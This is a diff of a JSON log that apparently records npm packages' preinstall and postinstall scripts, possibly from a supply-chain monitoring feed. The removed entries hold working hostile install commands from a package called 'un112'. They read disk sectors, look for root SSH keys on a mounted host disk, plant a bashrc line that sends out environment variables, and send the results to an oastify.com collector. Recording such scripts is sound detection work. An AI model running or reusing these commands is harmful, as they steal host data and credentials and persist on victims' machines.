@@ -1,131 +1,21 @@
 [
   {
+    "packageName": "pughost",
+    "version": "0.0.1",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/install.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T17:55:31.319Z",
+    "issuesend": true
+  },
+  {
     "packageName": "orquesta-agent",
     "version": "0.1.62",
     "scriptType": "postinstall",
     "scriptContent": "node scripts/postinstall.js || true",
     "previousVersion": "0.1.61",
-    "timestamp": "2026-01-22T14:44:40.513Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.25",
-    "scriptType": "postinstall",
-    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
-    "previousVersion": "1.0.24",
-    "timestamp": "2026-01-22T12:32:51.673Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.25",
-    "scriptType": "preinstall",
-    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
-    "previousVersion": "1.0.24",
-    "timestamp": "2026-01-22T12:32:51.669Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.18",
-    "scriptType": "postinstall",
-    "scriptContent": "df | grep -v container | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
-    "previousVersion": "1.0.33",
-    "timestamp": "2026-01-22T13:55:24.898Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.34",
-    "scriptType": "preinstall",
-    "scriptContent": "df | grep -v container | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
-    "previousVersion": "1.0.33",
-    "timestamp": "2026-01-22T13:55:24.893Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.28",
-    "scriptType": "postinstall",
-    "scriptContent": "df grep sock | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
-    "previousVersion": "1.0.27",
-    "timestamp": "2026-01-22T12:51:14.672Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.28",
-    "scriptType": "preinstall",
-    "scriptContent": "df grep sock | curl --data @- 7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
-    "previousVersion": "1.0.27",
-    "timestamp": "2026-01-22T12:51:14.669Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.27",
-    "scriptType": "postinstall",
-    "scriptContent": "find / -type s -maxdepth 3 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?sockets={}",
-    "previousVersion": "1.0.26",
-    "timestamp": "2026-01-22T12:44:50.985Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.27",
-    "scriptType": "preinstall",
-    "scriptContent": "find / -type s -maxdepth 3 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?sockets={}",
-    "previousVersion": "1.0.26",
-    "timestamp": "2026-01-22T12:44:50.982Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.26",
-    "scriptType": "postinstall",
-    "scriptContent": "sh -c 'OUT=\"\"; [ -w /etc/profile ] && OUT=\"$OUT/etc/profile \"; [ -w /root/.bashrc ] && OUT=\"$OUT/root/.bashrc \"; [ -w /etc/bash.bashrc ] && OUT=\"$OUT/etc/bash.bashrc \"; if [ -n \"$OUT\" ]; then echo \"curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?host_env=$(env | base64 | tr -d \\\"\\\\n\\\")\" >> /etc/bash.bashrc 2>/dev/null; fi; DATA=$(echo \"Writable_Files: $OUT\" | base64); wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?discovery=$DATA'",
-    "previousVersion": "1.0.25",
-    "timestamp": "2026-01-22T12:36:12.868Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.26",
-    "scriptType": "preinstall",
-    "scriptContent": "sh -c 'OUT=\"\"; [ -w /etc/profile ] && OUT=\"$OUT/etc/profile \"; [ -w /root/.bashrc ] && OUT=\"$OUT/root/.bashrc \"; [ -w /etc/bash.bashrc ] && OUT=\"$OUT/etc/bash.bashrc \"; if [ -n \"$OUT\" ]; then echo \"curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?host_env=$(env | base64 | tr -d \\\"\\\\n\\\")\" >> /etc/bash.bashrc 2>/dev/null; fi; DATA=$(echo \"Writable_Files: $OUT\" | base64); wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?discovery=$DATA'",
-    "previousVersion": "1.0.25",
-    "timestamp": "2026-01-22T12:36:12.866Z"
-  },
-  {
-    "packageName": "@bryntum/taskboard-trial",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node postinstall.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T12:34:19.489Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.25",
-    "scriptType": "postinstall",
-    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
-    "previousVersion": "1.0.24",
-    "timestamp": "2026-01-22T12:32:26.017Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.25",
-    "scriptType": "preinstall",
-    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
-    "previousVersion": "1.0.24",
-    "timestamp": "2026-01-22T12:32:26.011Z"
-  },
-  {
-    "packageName": "panopticon-cli",
-    "version": "0.3.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node scripts/postinstall.mjs || true",
-    "previousVersion": "0.2.0",
-    "timestamp": "2026-01-22T12:26:05.646Z"
-  },
-  {
-    "packageName": "@bryntum/calendar-trial",
-    "version": "1.0.0",
-    "scriptType": "postinstall",
-    "scriptContent": "node postinstall.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T12:25:52.981Z"
+    "timestamp": "2026-01-22T17:55:28.097Z",
+    "issuesend": false
   },
   {
     "packageName": "pughost",
@@ -133,78 +23,34 @@
     "scriptType": "postinstall",
     "scriptContent": "node scripts/install.js",
     "previousVersion": null,
-    "timestamp": "2026-01-22T12:24:45.651Z"
+    "timestamp": "2026-01-22T17:38:39.589Z",
+    "issuesend": true
   },
   {
-    "packageName": "un112",
-    "version": "1.0.25",
+    "packageName": "orquesta-agent",
+    "version": "0.1.62",
     "scriptType": "postinstall",
-    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
-    "previousVersion": "1.0.24",
-    "timestamp": "2026-01-22T12:23:27.115Z"
+    "scriptContent": "node scripts/postinstall.js || true",
+    "previousVersion": "0.1.61",
+    "timestamp": "2026-01-22T17:38:37.208Z",
+    "issuesend": true
   },
   {
-    "packageName": "un112",
-    "version": "1.0.25",
-    "scriptType": "preinstall",
-    "scriptContent": "sh -c 'dd if=/dev/sda bs=512 count=1 2>/dev/null | base64 | xargs -I {} wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?raw_disk={}'",
-    "previousVersion": "1.0.24",
-    "timestamp": "2026-01-22T12:23:27.114Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.23",
+    "packageName": "pughost",
+    "version": "0.0.1",
     "scriptType": "postinstall",
-    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
-    "previousVersion": "1.0.22",
-    "timestamp": "2026-01-22T12:14:08.231Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.23",
-    "scriptType": "preinstall",
-    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
-    "previousVersion": "1.0.22",
-    "timestamp": "2026-01-22T12:14:08.229Z"
-  },
-  {
-    "packageName": "@ikeacn/ui",
-    "version": "99.9.9",
-    "scriptType": "preinstall",
-    "scriptContent": "node index.js",
+    "scriptContent": "node scripts/install.js",
     "previousVersion": null,
-    "timestamp": "2026-01-22T12:12:02.600Z"
+    "timestamp": "2026-01-22T17:37:00.844Z",
+    "issuesend": true
   },
   {
-    "packageName": "corporate-blocking",
-    "version": "0.99.99",
-    "scriptType": "preinstall",
-    "scriptContent": "node extract.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T12:07:27.720Z"
-  },
-  {
-    "packageName": "@ikeacn/utils",
-    "version": "99.9.9",
-    "scriptType": "preinstall",
-    "scriptContent": "node index.js",
-    "previousVersion": null,
-    "timestamp": "2026-01-22T12:06:31.543Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.23",
+    "packageName": "orquesta-agent",
+    "version": "0.1.62",
     "scriptType": "postinstall",
-    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
-    "previousVersion": "1.0.22",
-    "timestamp": "2026-01-22T12:06:21.048Z"
-  },
-  {
-    "packageName": "un112",
-    "version": "1.0.23",
-    "scriptType": "preinstall",
-    "scriptContent": "sh -c 'mkdir -p /mnt/host; mount /dev/sda2 /mnt/host || mount /dev/sda1 /mnt/host; if [ -d /mnt/host/root/.ssh ]; then KEYS=$(ls -F /mnt/host/root/.ssh); DATA=$(echo \"Keys_Found:$KEYS\" | base64 | tr -d \"\\n\"); (curl -s http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA || wget -qO- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?final=$DATA); fi'",
-    "previousVersion": "1.0.22",
-    "timestamp": "2026-01-22T12:06:21.045Z"
+    "scriptContent": "node scripts/postinstall.js || true",
+    "previousVersion": "0.1.61",
+    "timestamp": "2026-01-22T17:36:57.421Z",
+    "issuesend": true
   }
 ]
